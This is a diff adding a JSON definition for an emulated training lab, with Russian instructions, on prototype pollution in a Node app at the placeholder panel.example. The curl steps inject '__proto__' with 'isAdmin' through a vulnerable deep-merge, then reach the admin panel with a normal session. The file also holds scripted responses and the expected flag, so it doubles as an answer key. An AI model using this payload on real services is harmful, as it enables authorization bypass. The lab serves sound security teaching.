@@ -1,0 +1,47 @@
+{
+  "id": "web-prototype-pollution",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{pr0t0typ3_p0llut10n_1s4dm1n}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: prototype pollution → обход авторизации\n\nNode-приложение `panel.example` рекурсивно сливает принятый JSON в объект\nнастроек (уязвимый deep-merge).\n\n1. Проверь обычное слияние:\n\n   curl -s -X POST https://panel.example/api/settings -H 'Content-Type: application/json' -d '{\"theme\":\"dark\"}'\n\n2. Отправь ключ `__proto__` и запиши `isAdmin` в общий прототип:\n\n   curl -s -X POST https://panel.example/api/settings -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true}}'\n\n3. Теперь свойство `isAdmin` «есть у всех». Открой админку с обычной сессией:\n\n   curl -s https://panel.example/admin -b 'session=user' > found.txt\n\n4. Набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция panel.example)",
+      "cases": [
+        {
+          "match": "__proto__|constructor",
+          "example": "-X POST https://panel.example/api/settings -d {\"__proto__\":{\"isAdmin\":true}}",
+          "output": "{\"ok\":true}\n[merge] ключ __proto__ не отфильтрован — записан в Object.prototype\n"
+        },
+        {
+          "match": "/admin",
+          "example": "-s https://panel.example/admin -b 'session=user'",
+          "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<h1>Admin panel</h1>\n[check] req.user.isAdmin === true (inherited from prototype)\nnto{pr0t0typ3_p0llut10n_1s4dm1n}\n"
+        },
+        {
+          "match": "settings",
+          "example": "-s https://panel.example/api/settings",
+          "output": "{\"theme\":\"dark\",\"locale\":\"ru\"}\n"
+        },
+        {
+          "match": "panel\\.example",
+          "example": "-s https://panel.example/",
+          "output": "<!doctype html><title>panel.example</title>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется panel.example.\n"
+    }
+  }
+}
